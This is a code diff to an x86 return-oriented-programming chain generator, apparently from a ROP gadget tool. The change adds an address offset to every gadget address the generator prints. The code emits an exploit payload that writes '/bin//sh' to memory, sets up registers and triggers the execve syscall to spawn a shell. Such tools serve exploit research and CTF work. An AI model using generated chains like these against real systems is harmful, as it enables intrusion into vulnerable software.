@@ -16,9 +16,10 @@ import re
 from   capstone import *
 
 class ROPMakerX86:
-    def __init__(self, binary, gadgets):
+    def __init__(self, binary, gadgets, offset=0x0):
         self.__binary  = binary
         self.__gadgets = gadgets
+        self.__offset = offset
 
         self.__generate()
 
@@ -83,58 +84,60 @@ class ROPMakerX86:
         print "\t# Padding goes here"
         print "\tp = ''\n"
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
-        print "\tp += pack('<I', 0x%08x) # @ .data" %(dataAddr)
+        print "\toffset = 0x%08x" % self.__offset
+
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # @ .data" %(dataAddr)
         self.__padding(popDst, {})
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(popSrc["vaddr"], popSrc["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(popSrc["vaddr"], popSrc["gadget"])
         print "\tp += '/bin'"
         self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr}) # Don't overwrite reg dst
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
         self.__padding(write4where, {})
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
-        print "\tp += pack('<I', 0x%08x) # @ .data + 4" %(dataAddr + 4)
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # @ .data + 4" %(dataAddr + 4)
         self.__padding(popDst, {})
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(popSrc["vaddr"], popSrc["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(popSrc["vaddr"], popSrc["gadget"])
         print "\tp += '//sh'"
         self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 4}) # Don't overwrite reg dst
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
         self.__padding(write4where, {})
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
-        print "\tp += pack('<I', 0x%08x) # @ .data + 8" %(dataAddr + 8)
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # @ .data + 8" %(dataAddr + 8)
         self.__padding(popDst, {})
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(xorSrc["vaddr"], xorSrc["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(xorSrc["vaddr"], xorSrc["gadget"])
         self.__padding(xorSrc, {})
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
         self.__padding(write4where, {})
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(popEbx["vaddr"], popEbx["gadget"])
-        print "\tp += pack('<I', 0x%08x) # @ .data" %(dataAddr)
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(popEbx["vaddr"], popEbx["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # @ .data" %(dataAddr)
         self.__padding(popEbx, {})
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(popEcx["vaddr"], popEcx["gadget"])
-        print "\tp += pack('<I', 0x%08x) # @ .data + 8" %(dataAddr + 8)
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(popEcx["vaddr"], popEcx["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # @ .data + 8" %(dataAddr + 8)
         self.__padding(popEcx, {"ebx": dataAddr}) # Don't overwrite ebx
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(popEdx["vaddr"], popEdx["gadget"])
-        print "\tp += pack('<I', 0x%08x) # @ .data + 8" %(dataAddr + 8)
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(popEdx["vaddr"], popEdx["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # @ .data + 8" %(dataAddr + 8)
         self.__padding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 8}) # Don't overwrite ebx and ecx
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(xorEax["vaddr"], xorEax["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(xorEax["vaddr"], xorEax["gadget"])
         self.__padding(xorEax, {"ebx": dataAddr, "ecx": dataAddr + 8}) # Don't overwrite ebx and ecx
 
         for i in range(11):
-            print "\tp += pack('<I', 0x%08x) # %s" %(incEax["vaddr"], incEax["gadget"])
+            print "\tp += pack('<I', offset + 0x%08x) # %s" %(incEax["vaddr"], incEax["gadget"])
             self.__padding(incEax, {"ebx": dataAddr, "ecx": dataAddr + 8}) # Don't overwrite ebx and ecx
 
-        print "\tp += pack('<I', 0x%08x) # %s" %(syscall["vaddr"], syscall["gadget"])
+        print "\tp += pack('<I', offset + 0x%08x) # %s" %(syscall["vaddr"], syscall["gadget"])
 
     def __generate(self):
 
